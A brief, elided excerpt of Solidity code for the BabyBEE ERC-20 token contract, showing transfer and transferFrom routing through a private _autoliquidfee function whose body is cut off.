...
contract BabyBEE is IERC20, Ownable {
    ...
    function transferFrom(
        ...
        _autoliquidfee(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _autoliquidfee(msg.sender, recipient, amount);
        return true;
    }

    function _autoliquidfee(
        address from,
        address to,
        uint256 amount
    ) private {
